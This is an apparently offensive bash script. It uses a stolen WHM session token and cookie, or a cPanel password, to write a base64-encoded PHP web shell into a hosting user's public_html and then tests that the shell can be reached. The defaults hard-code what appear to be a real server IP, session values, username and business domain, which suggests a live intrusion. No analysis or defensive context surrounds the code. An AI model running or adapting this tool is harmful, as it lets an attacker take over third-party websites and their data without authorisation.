#!/bin/bash
# Get cPanel session token via WHM, then upload shell
# Usage: ./upload_with_cp_session.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <TARGET_USER> <TARGET_PASS> <TARGET_DOMAIN>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
TARGET_USER="${4:-wagamacy}"
TARGET_PASS="${5}"
TARGET_DOMAIN="${6:-wagamama.com.cy}"

if [ -z "$TARGET_PASS" ]; then
    echo "Usage: $0 <WHM_HOST> <SESSION> <COOKIE> <USER> <PASS> <DOMAIN>"
    echo ""
    echo "You need to provide the cPanel user password"
    exit 1
fi

echo "========================================"
echo "  Upload via cPanel Session Token"
echo "========================================"
echo ""
echo "Target: $TARGET_DOMAIN ($TARGET_USER)"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell loaded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

echo "[1/4] Getting cPanel session token for $TARGET_USER..."

# Try to login via WHM to get cPanel session
CP_SESSION=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cpanel_jsonapi_user=${TARGET_USER}" \
  -d "cpanel_jsonapi_module=Session" \
  -d "cpanel_jsonapi_func=create_session_for_user" \
  -d "cpanel_jsonapi_apiversion=3" \
  -d "user=${TARGET_USER}" \
  -d "service=cpaneld" 2>/dev/null)

echo "Session response:"
echo "$CP_SESSION" | python3 -m json.tool 2>/dev/null || echo "$CP_SESSION"
echo ""

# Extract session token from response
CP_TOKEN=$(echo "$CP_SESSION" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    if 'data' in data and 'token' in data['data']:
        print(data['data']['token'])
    elif 'cpanelresult' in data and 'apitoken' in data['cpanelresult']:
        print(data['cpanelresult']['apitoken'])
    elif 'metadata' in data and 'result' in data['metadata']:
        print('OK')
except:
    pass
" 2>/dev/null)

if [ -n "$CP_TOKEN" ] && [ "$CP_TOKEN" != "OK" ]; then
    echo "✅ Got cPanel session: $CP_TOKEN"
    echo ""
    echo "[2/4] Using cPanel session to upload shell..."

    # Upload using cPanel session
    UPLOAD_RESULT=$(curl -sk "https://${TARGET_DOMAIN}:2083${CP_TOKEN}/execute/Fileman/write_file" \
      -H "Authorization: cpanel ${TARGET_USER}:${CP_TOKEN}" \
      -H "Content-Type: application/json" \
      -d "{\"path\": \"/home/${TARGET_USER}/public_html/shell.php\", \"content\": \"${SHELL_B64}\", \"encoding\": \"base64\"}" 2>/dev/null)

    echo "Upload result:"
    echo "$UPLOAD_RESULT" | python3 -m json.tool 2>/dev/null || echo "$UPLOAD_RESULT"
else
    echo "❌ Could not get cPanel session via WHM API"
    echo ""
    echo "[2/4] Trying alternative: direct cPanel login..."

    # Try direct login to get session
    LOGIN_RESULT=$(curl -sk "https://${WHM_HOST}:2087/login" \
      -X POST \
      -d "user=${TARGET_USER}" \
      -d "pass=${TARGET_PASS}" \
      -d "goto_uri=%2Fcpanel" \
      -D /tmp/login_headers.txt \
      -o /tmp/login_body.txt 2>/dev/null)

    echo "Login attempted"
    echo ""

    # Check for redirect and extract session
    REDIRECT_URL=$(grep -i "^location:" /tmp/login_headers.txt | head -1 | tr -d '\r' | cut -d' ' -f2)
    if [ -n "$REDIRECT_URL" ]; then
        echo "Redirected to: $REDIRECT_URL"

        # Extract session from redirect URL
        CP_SESSION=$(echo "$REDIRECT_URL" | grep -oP '/cpsess\d+' | head -1)
        if [ -n "$CP_SESSION" ]; then
            echo "✅ Extracted session: $CP_SESSION"
            echo ""
            echo "[3/4] Uploading shell via cPanel session..."

            # Now use this session to upload
            UPLOAD_RESULT=$(curl -sk "https://${WHM_HOST}:2083${CP_SESSION}/execute/Fileman/write_file" \
              -H "Content-Type: application/json" \
              -H "Cookie: cpsession=${CP_SESSION}" \
              -d "{\"path\": \"/home/${TARGET_USER}/public_html/shell.php\", \"content\": \"${SHELL_B64}\", \"encoding\": \"base64\"}" 2>/dev/null)

            echo "Upload result:"
            echo "$UPLOAD_RESULT" | python3 -m json.tool 2>/dev/null || echo "$UPLOAD_RESULT"
        fi
    fi

    rm -f /tmp/login_headers.txt /tmp/login_body.txt
fi

echo ""
echo "[3/4] Testing shell access..."
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET_DOMAIN}/shell.php")
echo "HTTP code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "✅ Shell accessible: https://${TARGET_DOMAIN}/shell.php"
elif [ "$HTTP_CODE" = "403" ]; then
    echo "⚠️  Returns 403 (may need proper permissions or auth)"
else
    echo "⚠️  Returns HTTP $HTTP_CODE"
fi

echo ""
echo "[4/4] Cleanup complete"
echo ""
echo "========================================"
